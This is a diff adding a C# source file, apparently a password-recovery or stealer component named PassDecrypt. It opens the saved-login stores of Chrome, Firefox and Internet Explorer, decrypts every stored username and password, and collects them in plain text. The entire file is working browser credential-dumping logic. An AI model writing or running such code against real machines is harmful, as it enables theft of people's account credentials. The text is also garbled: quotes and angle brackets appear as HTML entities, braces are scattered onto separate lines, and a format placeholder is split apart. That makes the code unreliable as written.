@@ -1,0 +1,216 @@
+using System.IO;
+using System.Collections.Generic;
+using SQLiteWrapper;
+using Newtonsoft.Json;
+
+namespace PassDecrypt
+{
+
+	public static class LoginReader
+	{
+
+		private static readonly string LocalAppDataFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+		private static readonly string RoamingAppDataFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+		private const string SQLiteConnectionString = &quot;Data Source=\&quot;{
+0
+}\&quot;;Version=3;FailIfMissing=True&quot;;
+
+		public static IEnumerable&lt;LoginInfo&gt; GetLoginsChrome()
+		{
+
+			string path = Path.Combine(LocalAppDataFolder, &quot;Google\\Chrome\\User Data\\Default\\Login Data&quot;);
+			var logins = new List&lt;LoginInfo&gt;();
+			if (!Directory.Exists(Path.GetDirectoryName(path)))
+				return logins;
+
+			string connString = String.Format(SQLiteConnectionString, path);
+
+			using (SQLiteConnection conn = new SQLiteConnection(connString))
+			{
+
+				conn.Open();
+				SQLiteCommand command = conn.CreateCommand();
+				command.CommandText =
+					&quot;SELECT username_value, password_value, origin_url FROM logins WHERE blacklisted_by_user = 0&quot;;
+				using (var reader = command.ExecuteReader())
+				{
+
+					while (reader.Read())
+					{
+
+						var passwordBuffer = (byte[])reader.GetValue(1);
+						var login = new LoginInfo
+						{
+
+							UserName = reader.GetString(0),
+							Password = CryptoAPI.Decrypt(passwordBuffer),
+							Url = reader.GetString(2),
+							Browser = &quot;Chrome&quot;
+						
+};
+						logins.Add(login);
+					
+}
+				
+}
+				command.Dispose();
+			
+}
+			return logins;
+		
+}
+
+		public static IEnumerable&lt;LoginInfo&gt; GetLoginsFirefox()
+		{
+
+			string signonsFile = null;
+			string loginsFile = null;
+			bool signonsFound = false;
+			bool loginsFound = false;
+			string[] dirs = Directory.GetDirectories(Path.Combine(RoamingAppDataFolder, &quot;Mozilla\\Firefox\\Profiles&quot;));
+
+			var logins = new List&lt;LoginInfo&gt;();
+			if (dirs.Length == 0)
+				return logins;
+
+			foreach (string dir in dirs)
+			{
+
+				string[] files = Directory.GetFiles(dir, &quot;signons.sqlite&quot;);
+				if (files.Length &gt; 0)
+				{
+
+					signonsFile = files[0];
+					signonsFound = true;
+				
+}
+
+				// find &quot;logins.json&quot; file
+				files = Directory.GetFiles(dir, &quot;logins.json&quot;);
+				if (files.Length &gt; 0)
+				{
+
+					loginsFile = files[0];
+					loginsFound = true;
+				
+}
+
+				if (loginsFound || signonsFound)
+				{
+
+					CryptoAPI.FFDecryptor.Init(dir);
+					break;
+				
+}
+			
+}
+
+			if (signonsFound)
+			{
+
+				string connString = String.Format(SQLiteConnectionString, signonsFile);
+				using (SQLiteConnection conn = new SQLiteConnection(connString))
+				{
+
+					conn.Open();
+					SQLiteCommand command = conn.CreateCommand();
+					command.CommandText = &quot;SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins&quot;;
+					using (var reader = command.ExecuteReader())
+					{
+
+						while (reader.Read())
+						{
+
+							string username = CryptoAPI.FFDecryptor.Decrypt(reader.GetString(0));
+							string password = CryptoAPI.FFDecryptor.Decrypt(reader.GetString(1));
+
+							var login = new LoginInfo
+							{
+
+								UserName = username,
+								Password = password,
+								Url = reader.GetString(2),
+								Browser = &quot;Firefox&quot;
+							
+};
+							logins.Add(login);
+						
+}
+					
+}
+					command.Dispose();
+				
+}
+			
+}
+
+			// read logins from &quot;logins.json&quot;
+			if (loginsFound)
+			{
+
+				FFLogins ffLoginData;
+				using (StreamReader sr = new StreamReader(loginsFile))
+				{
+
+					string json = sr.ReadToEnd();
+					ffLoginData = JsonConvert.DeserializeObject&lt;FFLogins&gt;(json);
+				
+}
+
+				foreach (LoginData loginData in ffLoginData.logins)
+				{
+
+					string username = CryptoAPI.FFDecryptor.Decrypt(loginData.encryptedUsername);
+					string password = CryptoAPI.FFDecryptor.Decrypt(loginData.encryptedPassword);
+					LoginInfo login = new LoginInfo
+					{
+
+						UserName = username,
+						Password = password,
+						Url = loginData.hostname,
+						Browser = &quot;Firefox&quot;
+					
+};
+					logins.Add(login);
+				
+}
+			
+}
+
+			return logins;
+		
+}
+
+		public static IEnumerable&lt;LoginInfo&gt; GetLoginsIE()
+		{
+
+			var logins = new List&lt;LoginInfo&gt;();
+			using (ExplorerUrlHistory urlHistory = new ExplorerUrlHistory())
+			{
+
+				List&lt;string[]&gt; dataList = new List&lt;string[]&gt;();
+
+				foreach (var entry in urlHistory)
+				{
+
+					if (CryptoAPI.DecryptIePassword(entry.UrlString, dataList))
+						foreach (string[] data in dataList)
+							logins.Add(new LoginInfo
+							{
+
+								UserName = data[0],
+								Password = data[1],
+								Url = entry.UrlString,
+								Browser = &quot;IExplorer&quot;
+							
+});
+				
+}
+			
+}
+
+			return logins;
+		
+}
+	
+}
